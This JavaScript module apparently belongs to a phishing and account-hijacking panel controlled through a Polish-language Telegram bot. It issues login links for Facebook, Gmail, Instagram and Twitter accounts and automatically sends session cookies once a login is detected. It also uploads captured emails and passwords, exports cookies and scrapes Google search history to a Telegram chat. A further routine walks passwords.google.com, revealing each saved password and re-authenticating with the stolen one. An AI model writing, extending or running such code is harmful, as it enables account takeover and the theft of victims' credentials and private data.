// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op when TELEGRAM_BOT_TOKEN /
// TELEGRAM_CHAT_ID aren't configured, or when Telegram itself is unreachable.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  const body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch { /* best-effort */ }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Helper ────────────────────────────────────────────────────────────────────

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

// ── /adduser <login> <password> — create panel user ──────────────────────────

async function handlePanelAdduser(chatId, args) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /adduser <login> <hasło>\nHasło min. 8 znaków.');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  const password = String(args[1]);
  // Validate before touching userdb
  if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
    await replyTo(chatId, '❌ Login: tylko litery a-z, cyfry, _ lub -. Max 64 znaki.');
    return;
  }
  if (password.length < 8) {
    await replyTo(chatId, '❌ Hasło za krótkie (min. 8 znaków).');
    return;
  }
  try {
    const { createUser } = await import('./userdb.js');
    await createUser(username, password);
    await replyTo(chatId, `✅ Użytkownik "${username}" utworzony.`);
  } catch (err) {
    if (err?.message === 'username_taken') {
      await replyTo(chatId, `❌ Login "${username}" już istnieje.`);
    } else {
      await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
    }
  }
}

// ── /users — list panel users ─────────────────────────────────────────────────

async function handleUsers(chatId) {
  try {
    const { listUsers } = await import('./userdb.js');
    const users = await listUsers();
    if (users.length === 0) {
      await replyTo(chatId, 'Brak użytkowników.');
      return;
    }
    const lines = users.map(u => {
      const date = new Date(u.createdAt).toISOString().slice(0, 10);
      const status = u.active ? '✓' : '✗';
      return `${status} ${u.username}  (${date})`;
    });
    await replyTo(chatId, `Użytkownicy (${users.length}):\n${lines.join('\n')}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /deluser <login> — delete panel user ─────────────────────────────────────

async function handleDeluser(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /deluser <login>');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  try {
    const { deleteUser } = await import('./userdb.js');
    const { deleteSessionsByUsername } = await import('./session.js');
    const removed = await deleteUser(username);
    if (!removed) {
      await replyTo(chatId, `❌ Nie znaleziono użytkownika "${username}".`);
      return;
    }
    deleteSessionsByUsername(username);
    await replyTo(chatId, `✅ Usunięto użytkownika "${username}" i unieważniono jego sesje.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /getpass [id] — show stored credentials ───────────────────────────────────

async function handleGetPass(chatId, args) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (args.length > 0) {
      const id = args[0].toLowerCase();
      const acc = list.find(a => a.id === id);
      if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
      const lines = [`📋 Konto: ${acc.label} (${acc.id})`];
      if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
      if (acc.password) lines.push(`🔑 Hasło: ${acc.password}`);
      if (!acc.email && !acc.password) lines.push('(brak zapisanych danych logowania)');
      await replyTo(chatId, lines.join('\n'));
    } else {
      // List all accounts with stored credentials
      const withCreds = list.filter(a => a.email || a.password);
      if (withCreds.length === 0) { await replyTo(chatId, 'Brak zapisanych danych logowania.'); return; }
      const lines = [`🔐 Zapisane dane (${withCreds.length}):`];
      for (const acc of withCreds) {
        lines.push(`\n📋 ${acc.label} (${acc.id})`);
        if (acc.email)    lines.push(`  📧 ${acc.email}`);
        if (acc.password) lines.push(`  🔑 ${acc.password}`);
      }
      await replyTo(chatId, lines.join('\n'));
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /cookies <id> — export cookies as JSON file ───────────────────────────────

async function handleCookies(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /cookies <id>');
    return;
  }
  const id = args[0].toLowerCase();
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(id);
    if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
    const { getContext } = await import('./browser.js');
    const ctx = getContext(id);
    if (!ctx) { await replyTo(chatId, `❌ Sesja "${id}" nie jest uruchomiona.`); return; }
    const cookies = await ctx.cookies();
    const json = JSON.stringify(cookies, null, 2);
    const buf = Buffer.from(json, 'utf8');
    await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /accounts — list all accounts ────────────────────────────────────────────

async function handleAccounts(chatId) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) { await replyTo(chatId, 'Brak kont.'); return; }
    const lines = [`📱 Konta (${list.length}):`];
    for (const acc of list) {
      const hasCreds = acc.email || acc.password ? ' 🔑' : '';
      lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
    }
    lines.push('\nUżyj /getpass <id> lub /cookies <id>');
    await replyTo(chatId, lines.join('\n'));
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /addaccount <name> <platform> — create account ───────────────────────────

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/', gm: 'https://mail.google.com/mail/u/0/',
  google: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
  twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
};
const PLATFORM_LABELS = {
  facebook: 'Facebook', fb: 'Facebook',
  gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
  instagram: 'Instagram', ig: 'Instagram',
  twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
};
const PLATFORM_CANONICAL = {
  facebook: 'facebook', fb: 'facebook',
  gmail: 'gmail', gm: 'gmail', google: 'gmail',
  instagram: 'instagram', ig: 'instagram',
  twitter: 'twitter', tw: 'twitter', x: 'twitter',
};

async function handleAddAccount(chatId, args, publicHost) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Nieznana platforma: "${platform}"\nDostępne: facebook (fb), gmail (gm), instagram (ig), twitter (tw)`);
    return;
  }
  const canonical = PLATFORM_CANONICAL[platform];
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) { await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.'); return; }
  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start, stop, wipeProfile } = await import('./browser.js');
    const existed = Boolean(await getAccount(id));
    if (!existed) { await stop(id).catch(() => {}); await wipeProfile(id); }
    await saveAccount({ id, label, startUrl });
    await start(id, '127.0.0.1').catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const host = publicHost || config.publicHost;
    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(brak PUBLIC_HOST)';
    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /panel — inline keyboard main menu ───────────────────────────────────────

async function editMessage(chatId, messageId, text) {
  try {
    await fetch(apiUrl('editMessageText'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

async function sendInlineMessage(chatId, text, inline_keyboard) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        reply_markup: { inline_keyboard },
        disable_web_page_preview: true,
      }),
    });
  } catch { /* best-effort */ }
}

async function answerCallback(callbackQueryId, text) {
  try {
    await fetch(apiUrl('answerCallbackQuery'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
    });
  } catch { /* best-effort */ }
}

async function handlePanel(chatId, publicHost) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) {
      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
      return;
    }
    const keyboard = list.map(acc => {
      const icon = acc.email ? '🔑 ' : '';
      return [{ text: `${icon}${acc.label}`, callback_data: `acc:${acc.id}` }];
    });
    keyboard.push([{ text: '➕ Dodaj konto', callback_data: 'help:addaccount' }]);
    await sendInlineMessage(chatId, `📱 Konta (${list.length}):`, keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(accountId);
    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
    await answerCallback(callbackQueryId);

    const host = publicHost || config.publicHost;
    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;

    const lines = [`📋 *${acc.label}*`];
    if (acc.email)    lines.push(`📧 ${acc.email}`);
    if (acc.password) lines.push(`🔑 ${acc.password}`);

    const keyboard = [
      [
        { text: '🔑 Hasła (plik)', callback_data: `pass:${accountId}` },
        { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
      ],
      [
        { text: '📋 Historia wyszukiwań', callback_data: `hist:${accountId}` },
        { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
      ],
    ];
    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
    keyboard.push([{ text: '« Wróć', callback_data: 'panel' }]);

    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handlePassFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Generuję plik...');
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    const withCreds = accountId === 'all'
      ? list.filter(a => a.email || a.password)
      : list.filter(a => a.id === accountId && (a.email || a.password));
    if (withCreds.length === 0) {
      await replyTo(chatId, '(brak zapisanych danych logowania)');
      return;
    }
    const lines = [];
    for (const acc of withCreds) {
      lines.push(`=== ${acc.label} (${acc.id}) ===`);
      if (acc.email)    lines.push(`Email:  ${acc.email}`);
      if (acc.password) lines.push(`Hasło:  ${acc.password}`);
      lines.push('');
    }
    const buf = Buffer.from(lines.join('\n'), 'utf8');
    const fname = accountId === 'all' ? 'hasla-wszystkie.txt' : `hasla-${accountId}.txt`;
    await sendDocument(buf, fname, `🔑 Dane logowania${accountId === 'all' ? '' : ': ' + withCreds[0]?.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleHistoryFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Pobieram historię wyszukiwań...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { getContext } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
      const { start } = await import('./browser.js');
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji.`); return; }
    }

    const histPage = await ctx.newPage();
    try {
      // myactivity.google.com — search history
      await histPage.goto('https://myactivity.google.com/product/12?hl=pl', { waitUntil: 'networkidle', timeout: 25000 });
      await histPage.waitForTimeout(2000);

      // Scroll to load more entries
      let prevH = 0;
      for (let i = 0; i < 20; i++) {
        const h = await histPage.evaluate(() => document.body.scrollHeight);
        if (h === prevH) break;
        prevH = h;
        await histPage.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
        await histPage.waitForTimeout(700);
      }

      const entries = await histPage.evaluate(() => {
        const results = [];
        // Activity items have specific structure on myactivity.google.com
        const items = document.querySelectorAll(
          'div[data-hveid], .fp-display-item, c-wiz [jscontroller] li, div[jsname] a[href*="search"]'
        );
        items.forEach(el => {
          const t = el.textContent?.trim().replace(/\s+/g, ' ');
          if (t && t.length > 2 && t.length < 300) results.push(t);
        });
        if (results.length) return [...new Set(results)];
        // Fallback
        return document.body.innerText.split('\n').map(l => l.trim()).filter(l => l.length > 3);
      }).catch(() => []);

      if (!entries.length) {
        await replyTo(chatId, `❌ Brak historii lub konto nie jest zalogowane w Google (${acc.label}).`);
        return;
      }
      const buf = Buffer.from(entries.join('\n'), 'utf8');
      await sendDocument(buf, `historia-${accountId}.txt`, `📋 Historia wyszukiwań: ${acc.label} (${entries.length} wpisów)`);
    } finally {
      await histPage.close().catch(() => {});
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Pobieram hasła z Google...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { getContext } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
      const { start } = await import('./browser.js');
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
    }

    const pwPage = await ctx.newPage();
    try {
      await pwPage.goto('https://passwords.google.com/', { waitUntil: 'networkidle', timeout: 25000 });
      await pwPage.waitForTimeout(2000);

      // Scroll to load all lazy-loaded entries
      let prev = 0;
      for (let i = 0; i < 30; i++) {
        const h = await pwPage.evaluate(() => document.body.scrollHeight);
        if (h === prev) break;
        prev = h;
        await pwPage.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
        await pwPage.waitForTimeout(500);
      }

      // Find all clickable list items (password rows)
      const rowCount = await pwPage.evaluate(() => {
        return document.querySelectorAll('div[role="listitem"], li[jscontroller], [data-identifier]').length
          || document.querySelectorAll('c-wiz[jsrenderer] li').length
          || document.querySelectorAll('li').length;
      });

      // Click each row, reveal password, handle re-auth if needed
      const results = [];
      const MASK = '•';

      // Get list of all row locators
      const rows = pwPage.locator('div[role="listitem"]:has(button), li:has(button[aria-label])').or(
        pwPage.locator('c-wiz li')
      );
      const count = await rows.count().catch(() => 0);

      const limit = Math.min(count || 0, 200);

      // Send initial progress message and keep its ID for edits
      let progressMsgId = null;
      try {
        const r = await fetch(apiUrl('sendMessage'), {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: `🔐 Pobieram hasła: 0 / ${limit}` }),
        });
        const d = await r.json();
        progressMsgId = d.result?.message_id;
      } catch {}

      for (let i = 0; i < limit; i++) {
        try {
          const row = rows.nth(i);
          const rowText = await row.innerText().catch(() => '');
          await row.click({ timeout: 5000 });
          await pwPage.waitForTimeout(800);

          // Try to find and click "show password" button (eye icon)
          const eyeBtn = pwPage.locator('button[aria-label*="Show"], button[aria-label*="Pokaż"], button[aria-label*="show"], [aria-label*="password visibility"]').first();
          if (await eyeBtn.isVisible({ timeout: 1500 }).catch(() => false)) {
            await eyeBtn.click().catch(() => {});
            await pwPage.waitForTimeout(600);
          }

          // Handle re-auth
          const reAuthInput = pwPage.locator('input[type="password"]:visible').first();
          if (await reAuthInput.isVisible({ timeout: 1000 }).catch(() => false)) {
            if (acc.password) {
              await reAuthInput.fill(acc.password);
              await pwPage.keyboard.press('Enter');
              await pwPage.waitForTimeout(1200);
              if (await eyeBtn.isVisible({ timeout: 1000 }).catch(() => false)) {
                await eyeBtn.click().catch(() => {});
                await pwPage.waitForTimeout(600);
              }
            }
          }

          const pwValue = await pwPage.locator('input[type="text"]').first().inputValue().catch(() => '');
          const detailText = await pwPage.locator('[aria-label*="Website"], [aria-label*="site"], [aria-label*="witryn"]').first().innerText().catch(() => '');
          const userText   = await pwPage.locator('[aria-label*="sername"], [aria-label*="email"], [aria-label*="użytk"]').first().innerText().catch(() => '');

          const site = detailText || rowText.split('\n')[0] || `wpis-${i + 1}`;
          const user = userText  || rowText.split('\n')[1] || '';
          const pw   = pwValue && !pwValue.includes(MASK) ? pwValue : '(nie udało się)';
          results.push(`${site} | ${user} | ${pw}`);

          // Close / go back
          const closeBtn = pwPage.locator('button[aria-label*="Close"], button[aria-label*="Zamknij"], button[aria-label*="Back"], [aria-label*="Wróć"]').first();
          if (await closeBtn.isVisible({ timeout: 800 }).catch(() => false)) {
            await closeBtn.click().catch(() => {});
          } else {
            await pwPage.goBack({ timeout: 4000 }).catch(() => {});
          }
          await pwPage.waitForTimeout(400);
        } catch { /* skip broken row */ }

        // Update progress every 10 entries
        if (progressMsgId && (i + 1) % 10 === 0) {
          await editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${i + 1} / ${limit}`);
        }
      }

      if (progressMsgId) {
        await editMessage(chatId, progressMsgId, `✅ Gotowe: ${results.length} / ${limit} wpisów`);
      }

      if (!results.length) {
        await replyTo(chatId, `❌ Nie udało się pobrać haseł (${acc.label}).`);
        return;
      }

      const buf = Buffer.from(results.join('\n'), 'utf8');
      await sendDocument(buf, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${results.length} wpisów)`);
    } finally {
      await pwPage.close().catch(() => {});
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── Long-poll command listener ────────────────────────────────────────────────

export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  async function poll() {
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;

          // ── callback_query (inline keyboard button) ──
          if (upd.callback_query) {
            const cq = upd.callback_query;
            const fromId = String(cq.from?.id || '');
            if (adminId && fromId !== adminId) { await answerCallback(cq.id, '⛔ Brak dostępu'); continue; }
            const chatId = cq.message?.chat?.id;
            const d = cq.data || '';

            if (d === 'panel') {
              await handlePanel(chatId, publicHost);
              await answerCallback(cq.id);
            } else if (d.startsWith('acc:')) {
              await handleAccountMenu(chatId, d.slice(4), cq.id, publicHost);
            } else if (d.startsWith('pass:')) {
              await handlePassFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('cook:')) {
              await answerCallback(cq.id, '⏳ Pobieram cookies...');
              await handleCookies(chatId, [d.slice(5)]);
            } else if (d.startsWith('hist:')) {
              await handleHistoryFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpas:')) {
              await handleGooglePasswords(chatId, d.slice(5), cq.id);
            } else if (d === 'help:addaccount') {
              await answerCallback(cq.id);
              await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
            } else {
              await answerCallback(cq.id);
            }
            continue;
          }

          // ── message / command ──
          const msg = upd.message;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || '');
          const chatId = msg.chat?.id;
          if (adminId && fromId !== adminId) continue;
          const text = msg.text.trim();
          const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
          if (!cmdMatch) continue;
          const cmd = cmdMatch[1].toLowerCase();
          const rest = cmdMatch[2].trim();
          const parts = rest ? rest.split(/\s+/) : [];

          if (cmd === '/panel' || cmd === '/start') {
            await handlePanel(chatId, publicHost);
          } else if (cmd === '/adduser') {
            await handlePanelAdduser(chatId, parts);
          } else if (cmd === '/users') {
            await handleUsers(chatId);
          } else if (cmd === '/deluser') {
            await handleDeluser(chatId, parts);
          } else if (cmd === '/addaccount') {
            await handleAddAccount(chatId, parts, publicHost);
          } else if (cmd === '/getpass') {
            await handleGetPass(chatId, parts);
          } else if (cmd === '/cookies') {
            await handleCookies(chatId, parts);
          } else if (cmd === '/accounts') {
            await handleAccounts(chatId);
          }
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
